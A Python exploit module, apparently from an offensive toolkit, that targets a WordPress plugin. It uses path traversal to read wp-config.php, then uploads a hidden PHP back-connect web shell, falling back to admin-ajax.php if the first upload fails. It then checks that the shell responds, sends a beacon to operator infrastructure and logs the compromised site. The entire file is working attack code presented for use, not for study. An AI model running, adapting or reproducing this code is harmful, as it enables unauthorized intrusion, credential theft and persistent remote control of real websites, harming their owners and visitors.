# MINC - CVE-2023-3169 (WordPress LFI → Shell Drop)

import requests
import os
from random import randint
from modules.encrypt_module import generate_payload_blob
from modules.cdn_rotator import get_current_cdn_url

try:
    from modules.shell_logger import log_shell_report
except ImportError:
    log_shell_report = None

try:
    from modules.beacon_logic import send_beacon
except ImportError:
    send_beacon = None

# --- Static Targets ---
VULN_PATH = "/wp-content/plugins/vulnerable-plugin/download.php?file=../../../../wp-config.php"
UPLOAD_ENDPOINT = "/wp-content/plugins/vulnerable-plugin/upload.php"
AJAX_FALLBACK_ENDPOINT = "/wp-admin/admin-ajax.php"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (AlienDrop/ReconModule)"
}

def run(target, recon_data=None):
    url = f"http://{target}{VULN_PATH}"
    print(f"[CVE-3169] Probing {url} for LFI vulnerability...")

    try:
        r = requests.get(url, headers=HEADERS, timeout=8)
        if "DB_NAME" not in r.text:
            print("[CVE-3169] LFI check failed — target not exploitable.")
            return False
    except Exception as e:
        print(f"[CVE-3169] Error during LFI probe: {e}")
        return False

    print("[CVE-3169] LFI confirmed. Proceeding to shell drop...")

    filename = f".drop_{randint(1000,9999)}.php"
    shell_payload = generate_payload_blob(filename, drop_type="php_backconnect")

    cdn_base = get_current_cdn_url()
    dropped_url = f"{cdn_base}/wp-content/plugins/vulnerable-plugin/uploads/{filename}"

    # === Attempt primary upload ===
    upload_url = f"http://{target}{UPLOAD_ENDPOINT}"
    files = {'file': (filename, shell_payload.decode(), 'application/octet-stream')}

    try:
        upload = requests.post(upload_url, files=files, headers=HEADERS, timeout=8)
        if upload.status_code not in [200, 201, 204]:
            print(f"[CVE-3169] Primary upload failed ({upload.status_code}). Trying AJAX fallback...")

            # === Fallback to admin-ajax.php ===
            fallback_url = f"http://{target}{AJAX_FALLBACK_ENDPOINT}"
            data = {
                'action': 'upload_file',
                'filename': filename,
                'content': shell_payload.decode()
            }
            upload = requests.post(fallback_url, data=data, headers=HEADERS, timeout=8)

            if upload.status_code not in [200, 201, 204]:
                print(f"[CVE-3169] Fallback upload also failed ({upload.status_code})")
                return False

            dropped_url = f"{cdn_base}/wp-content/uploads/{filename}"  # typical fallback path

        # === Shell pingback check ===
        ping_url = f"{dropped_url}?task=pong"
        try:
            check = requests.get(ping_url, headers=HEADERS, timeout=6)
            if "pong" in check.text.lower():
                print(f"[CVE-3169] Shell live and responding at: {dropped_url}")
            else:
                print(f"[CVE-3169] Shell dropped but no pingback received.")
        except Exception:
            print(f"[CVE-3169] Shell ping check failed — assuming stealth drop.")

        # === Beacon if present ===
        if send_beacon:
            send_beacon(target, method="cve_2023_3169", drop_path=dropped_url)

        # === Log shell ===
        if log_shell_report:
            shell_id = f"cve3169_{randint(10000,99999)}"
            tags = ["wordpress", "lfi", "php"]
            tasks = ["php_backconnect"]
            metadata = {"target": target, "path": dropped_url}
            log_shell_report(shell_id, tags, tasks, metadata)

        return True

    except Exception as e:
        print(f"[CVE-3169] Shell upload error: {e}")
        return False

